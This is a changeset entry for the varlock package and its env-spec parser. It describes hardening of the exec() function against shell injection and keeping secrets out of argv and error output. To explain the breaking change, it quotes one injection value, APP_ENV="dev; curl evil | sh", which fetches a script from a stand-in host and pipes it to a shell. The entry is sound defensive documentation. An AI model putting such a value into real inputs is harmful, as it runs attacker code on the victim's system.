---
varlock: major
"@env-spec/parser": patch
---

`exec()` hardening:
- New argv form: `exec("./script", "--flag", $APP_ENV)` (two or more arguments) runs the program directly with no shell, one argument each, so no value can be read as shell syntax.
- **Breaking:** the string form now only takes a fixed command. Interpolating a value into it (``exec(`./script ${APP_ENV}`)`` or `$(./script ${APP_ENV})`) or running a value as the command (`exec($CMD)`) is a schema error, since a value like `APP_ENV="dev; curl evil | sh"` was run as shell. Move values to the argv form: `exec("./script", $APP_ENV)`.
- New options on both forms: `stdin=` (written to the command's stdin) and `env={...}` (extra environment for the command), so a secret can reach a CLI without going through argv where `ps` can read it; `cwd=` (relative to the env file); and `timeout=` (`"30s"`), which fails the item instead of hanging the load.
- A failing `exec()` now reports the command as written in the schema instead of with interpolated values filled in, so a secret passed as an argument no longer lands in error output.
